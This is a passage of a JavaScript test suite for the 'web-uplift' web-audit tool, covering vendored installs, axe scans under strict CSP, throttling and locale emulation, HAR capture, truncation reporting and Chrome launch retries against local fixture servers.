    `the vendored record must be sorted by name so the manifest is stable: ${JSON.stringify(names)}`,
  );
  assert(new Set(names).size === names.length, `the vendored record must not repeat a package: ${JSON.stringify(names)}`);
  for (const entry of vendored) {
    const manifestPath = join(target, '.web-uplift', 'node_modules', ...entry.name.split('/'), 'package.json');
    const copied = JSON.parse(readFileSync(manifestPath, 'utf8'));
    assert(
      copied.version === entry.version,
      `recorded version for ${entry.name} must match the installed tree: manifest says ${entry.version}, on disk ${copied.version}`,
    );
  }

  const evidenceUsage = run(process.execPath, ['.web-uplift/evidence/cli.mjs'], {
    cwd: target,
  });
  assert(evidenceUsage.status === 1, 'evidence CLI without args should print usage and exit 1');
  assert(
    evidenceUsage.stderr.includes('Usage: node evidence/cli.mjs') &&
      !evidenceUsage.stderr.includes('ERR_MODULE_NOT_FOUND'),
    `installed evidence CLI did not load cleanly:\n${evidenceUsage.stderr}`,
  );

  // The scorecard must be vendored too (aggregate/ + the runner/ it imports), so
  // an installed project can generate the interactive scorecard. A clean load
  // prints its usage; a missing aggregate/ or runner/ would throw at import.
  const scorecardUsage = run(process.execPath, ['.web-uplift/aggregate/scorecard.mjs'], { cwd: target });
  assert(
    !scorecardUsage.stderr.includes('ERR_MODULE_NOT_FOUND') && scorecardUsage.stderr.includes('scorecard'),
    `installed scorecard did not load (aggregate/ or runner/ not vendored?):\n${scorecardUsage.stderr}`,
  );
}

// The installed vendored tree is where a packaging defect shows up and the source tree
// cannot. A module that imports across the vended directories has to resolve inside the
// installed copy, because that is the shape that broke a shipped copy once already - the
// CLI imported a module the package did not carry. The scorecard load asserted above
// already exercises one such import transitively; this asserts the general class and says
// which modules it exercised. It reuses the target installed by testInstalledEvidenceCli
// rather than paying for a second pack+install, so it is registered immediately after it
// and fails loudly if that target is not there (web-uplift-uz9).
function testInstalledTreeRelativeImportsResolve() {
  const target = join(tmp, 'installed-target');
  const vendoredRoot = join(target, '.web-uplift');
  assert(
    existsSync(vendoredRoot),
    'installed tree: this check reuses the target installed by testInstalledEvidenceCli, which must run first',
  );
  const vendoredModules = (dir) =>
    readdirSync(dir, { withFileTypes: true }).flatMap((entry) =>
      entry.isDirectory()
        ? vendoredModules(join(dir, entry.name))
        : entry.name.endsWith('.mjs')
          ? [join(dir, entry.name)]
          : [],
    );
  const dangling = [];
  const crossDirectory = [];
  for (const file of vendoredModules(vendoredRoot)) {
    for (const match of readFileSync(file, 'utf8').matchAll(/(?:from|import)\s*\(?\s*['"](\.[^'"]+)['"]/g)) {
      const specifier = match[1];
      if (!existsSync(resolve(dirname(file), specifier))) dangling.push(`${relative(vendoredRoot, file)} -> ${specifier}`);
      if (specifier.startsWith('../')) crossDirectory.push({ file, specifier });
    }
  }
  assert(
    dangling.length === 0,
    `installed tree: every relative import must resolve inside the vendored tree, dangling: ${JSON.stringify(dangling)}`,
  );
  assert(
    crossDirectory.length > 0,
    'installed tree: expected at least one import crossing the vendored directories, otherwise this check exercises nothing',
  );
  for (const { file, specifier } of crossDirectory.slice(0, 5)) {
    const loaded = run(process.execPath, [
      '-e',
      `import(${JSON.stringify(pathToFileURL(file).href)}).catch((e) => { console.error('LOADFAIL ' + e.code); process.exit(3); })`,
    ]);
    // Not `status === 0`: several of these modules are entry points whose own main logic
    // prints usage and exits non-zero when there is nothing to do, which says nothing
    // about packaging. The discriminator is a MODULE-RESOLUTION failure, the same one the
    // scorecard assertion above uses.
    assert(
      !String(loaded.stderr).includes('ERR_MODULE_NOT_FOUND') &&
        !String(loaded.stderr).includes('LOADFAIL') &&
        !String(loaded.stderr).includes('Cannot find package'),
      `installed tree: ${relative(vendoredRoot, file)} imports ${specifier} across directories and must load, got: ${loaded.stderr || loaded.stdout}`,
    );
  }
}

function testUpdateDryRunReadsInstallManifest() {
  const target = join(tmp, 'update-target');
  mkdirSync(join(target, '.web-uplift'), { recursive: true });
  writeFileSync(join(target, '.web-uplift/manifest.json'), JSON.stringify({
    package: 'web-uplift',
    version: '0.0.1',
    installedAt: '2026-01-01T00:00:00.000Z',
    agents: ['codex'],
  }, null, 2) + '\n');

  const pkg = readJson('package.json');
  const result = run(process.execPath, [
    'bin/web-uplift.mjs',
    'update',
    '--agent',
    'codex',
    '--target',
    target,
    '--dry-run',
  ], { env: noUpdateEnv() });
  assert(result.status === 0, `update dry-run failed: ${result.stderr || result.stdout}`);
  assert(result.stdout.includes('Existing web-uplift install found: 0.0.1'), `update did not read old manifest:\n${result.stdout}`);
  assert(result.stdout.includes(`Updating to: ${pkg.version}`), `update did not print target version:\n${result.stdout}`);
  assert(result.stdout.includes('.web-uplift/manifest.json'), `update dry-run did not include manifest write:\n${result.stdout}`);
}

function testCachedUpdateWarning() {
  const cacheRoot = join(tmp, 'update-cache');
  mkdirSync(join(cacheRoot, 'web-uplift'), { recursive: true });
  writeFileSync(join(cacheRoot, 'web-uplift/update-check.json'), JSON.stringify({
    latest: '999.0.0',
    checkedAt: Date.now(),
  }, null, 2) + '\n');

  const result = run(process.execPath, [
    'bin/web-uplift.mjs',
    'install',
    '--agent',
    'codex',
    '--target',
    join(tmp, 'cached-update-target'),
    '--dry-run',
  ], {
    env: {
      ...process.env,
      XDG_CACHE_HOME: cacheRoot,
      CI: '',
      WEB_UPLIFT_NO_UPDATE_CHECK: '',
    },
  });
  assert(result.status === 0, `cached update warning command failed: ${result.stderr || result.stdout}`);
  assert(result.stderr.includes('web-uplift 999.0.0 is available'), `cached update warning was not printed:\n${result.stderr}`);
  assert(result.stderr.includes('npx -y web-uplift@latest update --agent all'), `cached update warning missed update command:\n${result.stderr}`);
}

async function testPreNavigationEmulation() {
  const html =
    '<!doctype html><script>' +
    "window.initialReduce = matchMedia('(prefers-reduced-motion: reduce)').matches;" +
    '</script>';
  const value = await gather(
    'evaluate',
    `data:text/html,${encodeURIComponent(html)}`,
    {
      quiet: true,
      wait: 0,
      emulateMedia: [{ name: 'prefers-reduced-motion', value: 'reduce' }],
      expr:
        "({ initial: window.initialReduce, current: matchMedia('(prefers-reduced-motion: reduce)').matches })",
    },
  );
  assert(value.initial === true, `emulated media was not visible during load: ${JSON.stringify(value)}`);
  assert(value.current === true, `emulated media was not visible after load: ${JSON.stringify(value)}`);
}

// The axe primitive must work where the audit was previously blind: a site
// with a strict script-src refuses CDN fetches and injected <script src>, so
// axe through the evaluate primitive silently returned nothing. The primitive
// reads the VENDORED axe-core from disk and enables Page.setBypassCSP scoped to
// itself. If either regresses this test finds no violations on a page that
// provably has them.
async function testAxePrimitiveBypassesStrictCsp() {
  const html =
    '<!doctype html><html><head><title>strict csp</title></head><body>' +
    '<h1>Title</h1><h3>Skipped level</h3>' +
    '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">' +
    '<button></button>' +
    '</body></html>';
  const server = http.createServer((req, res) => {
    res.writeHead(200, {
      'Content-Type': 'text/html',
      'Content-Security-Policy': "script-src 'self'; default-src 'self'",
    });
    res.end(html);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const result = await gather('axe', `http://127.0.0.1:${server.address().port}/`, { quiet: true, wait: 200 });
    const all = Object.values(result.violations).flat();
    const ids = all.map((v) => v.id);
    assert(result.toolVersion, `axe: toolVersion missing (injection failed?): ${JSON.stringify(result)}`);
    assert(ids.includes('image-alt'), `axe: image-alt not found under strict CSP: ${ids.join(', ')}`);
    assert(ids.includes('heading-order'), `axe: heading-order not found under strict CSP: ${ids.join(', ')}`);
    assert(ids.includes('button-name'), `axe: button-name not found under strict CSP: ${ids.join(', ')}`);
    assert(result.violations.critical.some((v) => v.id === 'image-alt'),
      'axe: violations must be grouped by impact (image-alt is critical)');
    for (const v of all) {
      assert(v.nodeCount >= v.nodes.length, `axe: ${v.id} node cap must be announced, not silent`);
      assert(v.nodes.length > 0 && v.nodes[0].target, `axe: ${v.id} should carry node targets`);
    }
    assert(result.counts.passes > 0, 'axe: counts should include concluded passes');
  } finally {
    server.close();
  }
}

// CWV thresholds are calibrated against mid-tier mobile on variable networks;
// an unthrottled headless desktop is the one configuration guaranteed to pass.
// The throttling conditions must be (a) actually applied to the connection/CPU
// and (b) recorded in the output, so a finding states the device class it was
// measured on.
async function testThrottlingConditions() {
  const html = '<!doctype html><html><head><title>t</title></head><body><h1>x</h1></body></html>';
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const base = `http://127.0.0.1:${server.address().port}/`;

    // The conditions a run was measured under are recorded in the output.
    const shaped = await gather('layout', base, {
      quiet: true,
      wait: 100,
      network: 'fast-3g',
      cpuThrottle: 4,
      viewport: { w: 360, h: 800 },
    });
    assert(shaped.conditions?.network?.profile === 'fast-3g',
      `throttle: layout output must record the network profile: ${JSON.stringify(shaped.conditions)}`);
    assert(shaped.conditions.network.downloadThroughputBps === 180000 &&
      shaped.conditions.network.uploadThroughputBps === 84375 &&
      shaped.conditions.network.latencyMs === 562.5,
      `throttle: fast-3g must carry the exact DevTools preset numbers: ${JSON.stringify(shaped.conditions.network)}`);
    assert(shaped.conditions.cpuThrottleRate === 4,
      `throttle: layout output must record the CPU rate: ${JSON.stringify(shaped.conditions)}`);
    assert(
      shaped.conditions.viewport?.width === 360 && shaped.conditions.viewport?.height === 800 &&
        shaped.conditions.viewport?.mobile === true && shaped.conditions.viewport?.deviceScaleFactor === 1 &&
        shaped.conditions.viewport?.profile === 'mobile',
      `conditions: the artifact must record the whole emulated profile, not only its size: ${JSON.stringify(shaped.conditions.viewport)}`,
    );

    // The same fixed size with the mobile profile switched off must record the
    // desktop profile, so the recorded value cannot be a constant.
    const desktopProfile = await gather('layout', base, {
      quiet: true,
      wait: 100,
      viewport: { w: 360, h: 800 },
      viewportMobile: false,
    });
    assert(
      desktopProfile.conditions.viewport?.mobile === false &&
        desktopProfile.conditions.viewport?.profile === 'desktop' &&
        desktopProfile.conditions.viewport?.width === 360,
      `conditions: an opted-out run must record the desktop profile: ${JSON.stringify(desktopProfile.conditions.viewport)}`,
    );

    // ...and a run with no device-metrics override must not claim one: an unemulated
    // run carries no viewport record rather than an invented profile.
    const noViewport = await gather('layout', base, { quiet: true, wait: 100 });
    assert(
      !noViewport.conditions || noViewport.conditions.viewport === undefined,
      `conditions: a run with no device-metrics override must not report an emulated profile: ${JSON.stringify(noViewport.conditions)}`,
    );

    // mobile-lighthouse applies its 4x CPU slowdown without a separate flag.
    const mobile = await gather('layout', base, { quiet: true, wait: 100, network: 'mobile-lighthouse' });
    assert(mobile.conditions.cpuThrottleRate === 4 && mobile.conditions.network.latencyMs === 150,
      `throttle: mobile-lighthouse must imply 4x CPU + 150ms RTT: ${JSON.stringify(mobile.conditions)}`);

    // The shaping must be REAL, not just recorded: a slow-3g RTT of 2000ms
    // shows up in a fetch the page makes.
    const probe = { quiet: true, wait: 100, expr: '(async()=>{const t=performance.now(); await fetch("/p"); return performance.now()-t;})()' };
    const plain = await gather('evaluate', base, probe);
    const throttled = await gather('evaluate', base, { ...probe, network: 'slow-3g' });
    assert(throttled > plain + 1000,
      `throttle: slow-3g should add ~2000ms RTT, got plain=${Math.round(plain)}ms shaped=${Math.round(throttled)}ms`);

    // An unthrottled run carries no conditions block at all (not an empty one).
    const unthrottled = await gather('layout', base, { quiet: true, wait: 100 });
    assert(!('conditions' in unthrottled),
      `throttle: an unthrottled run must not claim conditions: ${JSON.stringify(unthrottled.conditions)}`);

    // Unknown profiles fail loudly, never silently fall back to unshaped.
    let rejected = false;
    try {
      await gather('layout', base, { quiet: true, wait: 100, network: 'dial-up' });
    } catch (err) {
      rejected = /Unknown network profile/.test(err.message);
    }
    assert(rejected, 'throttle: an unknown profile must be rejected by name');
  } finally {
    server.close();
  }
}

// The three be-internationalised checks are only observable by rendering under
// a second locale / time zone and diffing what the page actually shows -
// source reading cannot see a hard-coded calendar assumption or a naive Date
// through a formatter. The overrides must be REAL (rendered output differs)
// and RECORDED (each side of the diff states its conditions).
async function testLocaleTimezoneConditions() {
  const probe =
    '({ tz: Intl.DateTimeFormat().resolvedOptions().timeZone,' +
    ' rendered: new Date(Date.UTC(2026, 0, 15, 2, 0)).toLocaleString(),' +
    ' num: (12345.678).toLocaleString() })';
  const url = 'data:text/html,<h1>i18n</h1>';

  const tokyo = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, timezone: 'Asia/Tokyo' });
  const newYork = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, timezone: 'America/New_York' });
  assert(tokyo.tz === 'Asia/Tokyo' && newYork.tz === 'America/New_York',
    `i18n: the timezone override must apply: ${tokyo.tz} / ${newYork.tz}`);
  assert(tokyo.rendered !== newYork.rendered,
    `i18n: 02:00 UTC must render as different local times in Tokyo and New York: ${tokyo.rendered} / ${newYork.rendered}`);
  assert(tokyo.conditions?.timezone === 'Asia/Tokyo' && newYork.conditions?.timezone === 'America/New_York',
    `i18n: each side of the diff must record its timezone: ${JSON.stringify(tokyo.conditions)} / ${JSON.stringify(newYork.conditions)}`);

  const german = await gather('evaluate', url, { quiet: true, wait: 0, expr: probe, locale: 'de-DE' });
  assert(german.num === '12.345,678',
    `i18n: de-DE must render the comma decimal separator: ${german.num}`);
  assert(german.conditions?.locale === 'de-DE',
    `i18n: the locale must be recorded: ${JSON.stringify(german.conditions)}`);

  // The screenshot primitive records its conditions too (it bypasses emit()
  // because its artifact is binary).
  const shot = await gather('screenshot', url, { quiet: true, wait: 0, locale: 'fr-FR', out: join(tmp, 'i18n-shot.png') });
  assert(shot.conditions?.locale === 'fr-FR',
    `i18n: the screenshot must record its locale: ${JSON.stringify(shot)}`);

  // Invalid values fail loudly instead of silently judging the default locale.
  for (const [opts, pattern] of [
    [{ locale: '!!bogus!!' }, /Invalid --locale/],
    [{ timezone: 'Mars/Olympus_Mons' }, /Invalid --timezone/],
  ]) {
    let rejected = false;
    try {
      await gather('evaluate', url, { quiet: true, wait: 0, expr: '1', ...opts });
    } catch (err) {
      rejected = pattern.test(err.message);
    }
    assert(rejected, `i18n: ${JSON.stringify(opts)} must be rejected by name`);
  }
}

async function testHarRedirects() {
  // Also covers the --bodies path: the document plus 12 scripts is more than the
  // body-fetch pool's in-flight limit, so the pool has to recycle its workers,
  // and the redirect entry must still end up with no body attached.
  const BODY_COUNT = 12;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/start') {
      res.writeHead(302, { Location: '/final' });
      res.end('redirecting');
      return;
    }
    if (/^\/s\d+\.js$/.test(path)) {
      res.writeHead(200, { 'Content-Type': 'text/javascript' });
      res.end(`window.__body_${path.slice(2, -3)} = true;`);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    const scripts = Array.from({ length: BODY_COUNT }, (_, i) => `<script src="/s${i}.js"></script>`).join('');
    res.end(`<!doctype html><title>ok</title><link rel="icon" href="data:,">${scripts}ok`);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'network.har');
    const result = await gather('har', `http://127.0.0.1:${port}/start`, {
      quiet: true,
      // 2.5s, not the 250ms this test used before it asserted on bodies: the
      // subresource loadingFinished events that make a body retrievable can
      // arrive well after the load event on a heavily stolen-CPU box, so a
      // tight window makes --bodies assertions flap for environmental reasons.
      wait: 2500,
      bodies: true,
      out,
    });
    assert(result.statusBreakdown['302'] === 1, `HAR status breakdown missed redirect: ${JSON.stringify(result.statusBreakdown)}`);

    const summary = JSON.parse(readFileSync(join(tmp, 'network-summary.json'), 'utf8'));
    assert(
      summary.hygiene.redirects.some((r) => r.status === 302 && r.location === '/final'),
      `HAR summary missed redirect hygiene entry: ${JSON.stringify(summary.hygiene.redirects)}`,
    );

    // --bodies must attach every retrievable body, including past the pool's
    // concurrency limit, and must not attach one to the redirect entry.
    const har = JSON.parse(readFileSync(out, 'utf8'));
    const withBody = har.log.entries.filter((e) => e.response?.content?.text !== undefined);
    assert(
      withBody.length === BODY_COUNT + 1,
      `--bodies must capture ${BODY_COUNT + 1} bodies (document + ${BODY_COUNT} scripts), got ${withBody.length}`,
    );
    for (let i = 0; i < BODY_COUNT; i++) {
      const entry = har.log.entries.find((e) => e.request.url.endsWith(`/s${i}.js`));
      assert(
        entry?.response?.content?.text === `window.__body_${i} = true;`,
        `--bodies missed or corrupted /s${i}.js body: ${JSON.stringify(entry?.response?.content)}`,
      );
    }
    const redirectEntry = har.log.entries.find((e) => e.request.url.endsWith('/start'));
    assert(redirectEntry?.response?.content?.text == null, '--bodies must not attach a body to the redirect entry');
    const documentEntry = har.log.entries.find((e) => e.request.url.endsWith('/final'));
    assert(documentEntry?.response?.content?.text?.includes('ok'), '--bodies must capture the document body');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// web-uplift-1s8: a cap that drops evidence must say so, in the JSON and on
// stderr. The dom primitive's 200000-character CSS/HTML cap is the dangerous
// one: a model grepping the returned css for "@container" cannot otherwise tell
// "the site does not use container queries" from "the evidence was cut off".
async function testEvidenceTruncationReporting() {
  const filler = 'z'.repeat(1000);
  const bigCss = Array.from({ length: 300 }, (_, i) => `.pad${i}{--filler-${i}:"${filler}"}`).join('\n');
  const pixel = Uint8Array.from(atob('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='), (c) => c.charCodeAt(0));

  const server = http.createServer((req, res) => {
    const path = (req.url || '/').split('?')[0];
    if (path === '/pixel.gif') {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(pixel);
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if (path === '/over-cap') {
      res.end(`<!doctype html><title>over</title><style>${bigCss}</style><h1>over</h1>`);
      return;
    }
    if (path === '/under-cap') {
      res.end('<!doctype html><title>under</title><style>.a{color:#123}</style><h1>under</h1>');
      return;
    }
    if (path === '/many-images') {
      const imgs = Array.from({ length: 40 }, (_, i) => `<img src="/pixel.gif?i=${i}" alt="pixel ${i}" width="1" height="1">`).join('');
      res.end(`<!doctype html><title>images</title>${imgs}`);
      return;
    }
    if (path === '/many-cookies') {
      res.end("<!doctype html><title>cookies</title><script>for (let i = 0; i < 51; i++) document.cookie = 'cap' + i + '=1;path=/';</script>");
      return;
    }
    res.end('<!doctype html><title>empty</title>');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    // Over the cap, through the real CLI: the JSON reports what was cut, stderr
    // says it out loud, and the shown text is exactly the cap.
    const cli = await runAsync(process.execPath, ['evidence/cli.mjs', 'dom', `${base}/over-cap`, '--wait', '250']);
    assert(cli.status === 0, `truncation: dom CLI failed:\n${cli.stderr}\n${cli.stdout}`);
    const over = JSON.parse(cli.stdout);
    assert(
      over.page.cssTruncated === true && over.page.cssChars > 200000 && over.page.css.length === 200000,
      `truncation: the 200KB CSS cap was not reported: ${JSON.stringify({ cssChars: over.page.cssChars, shown: over.page.css.length, truncated: over.page.cssTruncated })}`,
    );
    assert(
      over.page.outerHTML.length === Math.min(over.page.outerHTMLChars, 200000),
      'truncation: outerHTML length does not match its reported total',
    );
    assert(
      /WARNING: dom\.css/.test(cli.stderr),
      `truncation: the CLI did not warn about the cut CSS:\n${cli.stderr}`,
    );

    // Under the cap the same fields have to prove completeness: not truncated,
    // and the shown text is the whole text.
    const under = await gather('dom', `${base}/under-cap`, { quiet: true, wait: 250 });
    assert(
      under.page.cssTruncated === false && under.page.cssChars === under.page.css.length && under.page.css.length > 0,
      `truncation: a complete CSS sample was not reported as complete: ${JSON.stringify({ cssChars: under.page.cssChars, shown: under.page.css.length, truncated: under.page.cssTruncated })}`,
    );

    // The list caps report the same way: 40 images on the page, 30 listed.
    const images = await gather('images', `${base}/many-images`, { quiet: true, wait: 250 });
    assert(images.totalImages === 40, `truncation: images total is wrong: ${images.totalImages}`);
    assert(
      images.imagesInspected === 40 && images.imagesInspectedTruncated === false,
      `truncation: images inspection cap misreported: ${JSON.stringify({ inspected: images.imagesInspected, truncated: images.imagesInspectedTruncated })}`,
    );
    assert(
      images.imagesTruncated === true && images.images.length === 30,
      `truncation: images listing cap misreported: ${JSON.stringify({ listed: images.images.length, truncated: images.imagesTruncated })}`,
    );

    // 51 cookies set, 50 listed.
    const cookies = await gather('cookies', `${base}/many-cookies`, { quiet: true, wait: 250 });
    assert(cookies.totalCookies === 51, `truncation: cookies total is wrong: ${cookies.totalCookies}`);
    assert(
      cookies.cookiesTruncated === true && cookies.cookies.length === 50,
      `truncation: cookies listing cap misreported: ${JSON.stringify({ listed: cookies.cookies.length, truncated: cookies.cookiesTruncated })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

function testBatchDryRunUsesRetainedDirs() {
  const reports = join(tmp, 'reports');
  const result = run(process.execPath, [
    'runner/run-batch.mjs',
    '--dry-run',
    '--agent',
    'codex',
    '--out',
    reports,
    'https://example.com',
  ]);
  assert(result.status === 0, `batch dry-run failed: ${result.stderr || result.stdout}`);
  assert(
    result.stdout.includes(`${reports}/example_com/<timestamp>`),
    `batch dry-run did not use retained run dir:\n${result.stdout}`,
  );
  assert(!result.stdout.includes(`${reports}/codex/`), `batch dry-run still used old agent prefix:\n${result.stdout}`);
}

function testBatchFlowDryRun() {
  const reports = join(tmp, 'reports-flow');
  const flowPath = join(tmp, 'flow.json');
  writeFileSync(flowPath, JSON.stringify({
    title: 'Signup',
    steps: [{ type: 'navigate', url: 'https://example.com/' }, { type: 'click', selectors: [['#go']] }],
  }));
  const result = run(process.execPath, [
    'runner/run-batch.mjs', '--dry-run', '--agent', 'claude', '--out', reports, '--flow', flowPath, 'https://example.com',
  ]);
  assert(result.status === 0, `batch --flow dry-run failed: ${result.stderr || result.stdout}`);
  assert(result.stdout.includes('would replay') && result.stdout.includes('Signup'), `batch --flow dry-run did not announce the replay:\n${result.stdout}`);
  assert(result.stdout.includes('already replayed for you'.toLowerCase()) || result.stdout.includes('ALREADY replayed'), `batch --flow dry-run did not pass flow guidance to the agent:\n${result.stdout}`);
}

function packTarball() {
  const packDir = join(tmp, 'pack');
  mkdirSync(packDir, { recursive: true });
  const result = run('npm', ['pack', '--quiet', '--pack-destination', packDir]);
  assert(result.status === 0, `npm pack failed:\n${result.stderr || result.stdout}`);
  const file = result.stdout.trim().split('\n').filter(Boolean).pop();
  assert(file, `npm pack did not print a tarball name:\n${result.stdout}`);
  return join(packDir, file);
}

function readJson(path) {
  return JSON.parse(readFileSync(join(repoRoot, path), 'utf8'));
}

function noUpdateEnv() {
  return { ...process.env, WEB_UPLIFT_NO_UPDATE_CHECK: '1' };
}

function validateJson(ajv, schema, path) {
  const validate = ajv.compile(schema);
  const data = readJson(path);
  if (!validate(data)) {
    throw new Error(`${path} failed schema validation:\n${ajv.errorsText(validate.errors, { separator: '\n' })}`);
  }
}

function listFiles(dir, predicate, out = []) {
  for (const name of readdirSync(dir)) {
    if (SKIP_DIRS.has(name)) continue;
    const full = join(dir, name);
    const st = statSync(full);
    if (st.isDirectory()) listFiles(full, predicate, out);
    else if (predicate(full)) out.push(full);
  }
  return out;
}

// resolveChromePath must find a Chrome for Testing / Puppeteer cache binary when
// CHROME_BIN is not set. The fleet VMs have no distro Chrome, so before this an
// npm test run there failed only after it had already queued for the single
// heavy slot. No browser is launched: the candidates are plain files in a fake
// HOME, which also pins the override precedence (CHROME_BIN > CHROME_PATH >
// cache > distro).
function testChromeCandidateDiscovery() {
  const home = mkdtempSync(join(tmpdir(), 'web-uplift-chrome-cache-'));
  const cftNew = join(home, '.cache', 'chrome', 'linux-1000.0.0.0', 'chrome-linux64', 'chrome');
  const cftOld = join(home, '.cache', 'chrome', 'linux-999.0.8037.99', 'chrome-linux64', 'chrome');
  const puppeteer = join(home, '.cache', 'puppeteer', 'chrome', 'linux-888.0.0.0', 'chrome-linux64', 'chrome');
  const alias = join(home, 'chrome-path-alias');
  const binOverride = join(home, 'chrome-bin-override');
  for (const file of [cftNew, cftOld, puppeteer, alias, binOverride]) {
    mkdirSync(dirname(file), { recursive: true });
    writeFileSync(file, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  }

  const saved = new Map(['HOME', 'CHROME_BIN', 'CHROME_PATH'].map((name) => [name, process.env[name]]));
  try {
    process.env.HOME = home;
    delete process.env.CHROME_BIN;
    delete process.env.CHROME_PATH;

    assert(
      resolveChromePath() === cftNew,
      `CHROME_BIN unset: the newest cache version must win (numeric sort, not lexicographic), got ${resolveChromePath()}`,
    );
    // A cache path that exists but is not an executable file (a partial extract
    // or directory husk) must be skipped, not returned and left to fail at spawn.
    chmodSync(cftNew, 0o644);
    assert(
      resolveChromePath() === cftOld,
      `a non-executable cache entry must be skipped in favour of the next candidate, got ${resolveChromePath()}`,
    );
    chmodSync(cftNew, 0o755);
    assert(resolveChromePath() === cftNew, `an executable cache entry must be used, got ${resolveChromePath()}`);
    rmSync(cftNew);
    rmSync(cftOld);
    assert(
      resolveChromePath() === puppeteer,
      `CHROME_BIN unset: must fall back to the Puppeteer cache layout, got ${resolveChromePath()}`,
    );
    process.env.CHROME_PATH = alias;
    assert(
      resolveChromePath() === alias,
      `CHROME_PATH must be honoured as a CHROME_BIN alias, got ${resolveChromePath()}`,
    );
    process.env.CHROME_BIN = binOverride;
    assert(
      resolveChromePath() === binOverride,
      `CHROME_BIN must win over CHROME_PATH, got ${resolveChromePath()}`,
    );
  } finally {
    for (const [name, value] of saved) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
    rmSync(home, { recursive: true, force: true });
  }
}

// The launch layer must retry the WHOLE attempt (a fresh profile dir each time)
// and must say WHY it failed, because "still alive but silent" (a wedge) and
// "exited early" (a crash) are different faults with different fixes, and a
// bare "timed out" collapses them into one symptom. A fake CHROME_BIN that exits
// immediately, and one that fails once and then prints the DevTools line,
// exercise the retry, the diagnostics, the recovery and the profile-dir cleanup
// with no real browser, so this stays cheap and deterministic.
async function testLaunchRetryAndDiagnostics() {
  const savedBin = process.env.CHROME_BIN;
  const dir = mkdtempSync(join(tmpdir(), 'web-uplift-launch-retry-'));
  try {
    // Every attempt exits immediately: retry, then a diagnostic failure.
    const marker = join(dir, 'attempts');
    const failing = join(dir, 'failing-chrome');
    writeFileSync(failing, `#!/bin/sh\necho attempt >> "${marker}"\nexit 7\n`, { mode: 0o755 });
    const profiles = [];
    process.env.CHROME_BIN = failing;
    let error = null;
    try {
      await launchChrome({
        log: (line) => {
          const match = /profile (\S+)\)/.exec(line);
          if (match) profiles.push(match[1]);
        },
      });
    } catch (err) {
      error = err;
    }
    assert(error instanceof Error, 'launchChrome must reject when every attempt fails');
    assert(/exited early/.test(error.message), `launch failure must name the early exit: ${error.message}`);
    assert(/code 7/.test(error.message), `launch failure must report the exit code: ${error.message}`);
    assert(/freshProfile=true/.test(error.message), `launch failure must report a fresh profile: ${error.message}`);
    assert(/alive=false/.test(error.message), `launch failure must report liveness: ${error.message}`);
    assert(/stderr=/.test(error.message), `launch failure must report stderr: ${error.message}`);
    if (existsSync('/proc/loadavg')) {
      assert(/load=/.test(error.message), `launch failure must report host load: ${error.message}`);
    }
    const spawns = existsSync(marker) ? readFileSync(marker, 'utf8').trim().split('\n').filter(Boolean).length : 0;
    assert(profiles.length > 1, `launchChrome must retry the whole launch, saw ${profiles.length} attempt(s)`);
    assert(spawns === profiles.length, `each retry must spawn once, marker=${spawns} profiles=${profiles.length}`);
    assert(new Set(profiles).size === profiles.length, 'each retry must use a fresh profile dir');
    for (const profile of profiles) {
      assert(!existsSync(profile), `a failed launch must clean up its profile dir: ${profile}`);
    }

    // A wedge (browser still alive but never printing the DevTools line) must be
    // reported as ALIVE, not as the SIGTERM-killed process that teardown leaves
    // behind. The short timeout keeps this cheap, and this is the assertion that
    // fails if liveness is read after close() instead of before it.
    const wedging = join(dir, 'wedging-chrome');
    writeFileSync(wedging, '#!/bin/sh\nsleep 30\n', { mode: 0o755 });
    const wedgeProfiles = [];
    process.env.CHROME_BIN = wedging;
    let wedgeError = null;
    try {
      await launchChrome({
        devtoolsTimeoutMs: 400,
        log: (line) => {
          const match = /profile (\S+)\)/.exec(line);
          if (match) wedgeProfiles.push(match[1]);
        },
      });
    } catch (err) {
      wedgeError = err;
    }
    assert(wedgeError instanceof Error, 'a wedged chrome must fail the launch');
    assert(/alive=true/.test(wedgeError.message), `a wedge must be reported as alive-but-silent: ${wedgeError.message}`);
    assert(/signal=null/.test(wedgeError.message), `a wedge must not be reported as signal-killed: ${wedgeError.message}`);
    assert(/stderr=/.test(wedgeError.message), `a wedge must report stderr: ${wedgeError.message}`);
    assert(wedgeProfiles.length > 1, `a wedged launch must still retry, saw ${wedgeProfiles.length}`);
    for (const profile of wedgeProfiles) {
      assert(!existsSync(profile), `a wedged launch must clean up its profile dir: ${profile}`);
    }

    // A transient failure followed by a good launch must recover on retry.
    const counter = join(dir, 'count');
    const flaky = join(dir, 'flaky-chrome');
    writeFileSync(
      flaky,
      `#!/bin/sh\nn=$(cat "${counter}" 2>/dev/null || echo 0)\nn=$((n + 1))\necho $n > "${counter}"\n` +
        `if [ "$n" -ge 2 ]; then echo "DevTools listening on ws://127.0.0.1:9222/" 1>&2; sleep 30; fi\nexit 5\n`,
      { mode: 0o755 },
    );
    process.env.CHROME_BIN = flaky;
    const handle = await launchChrome({ log: () => {} });
    assert(handle.port === 9222, `a recovered launch must parse the DevTools port, got ${handle.port}`);
    assert(readFileSync(counter, 'utf8').trim() === '2', 'the flaky launch must recover on its second attempt');
    await handle.close();
    assert(!existsSync(handle.userDataDir), `close must remove the profile dir: ${handle.userDataDir}`);
  } finally {
    if (savedBin === undefined) delete process.env.CHROME_BIN;
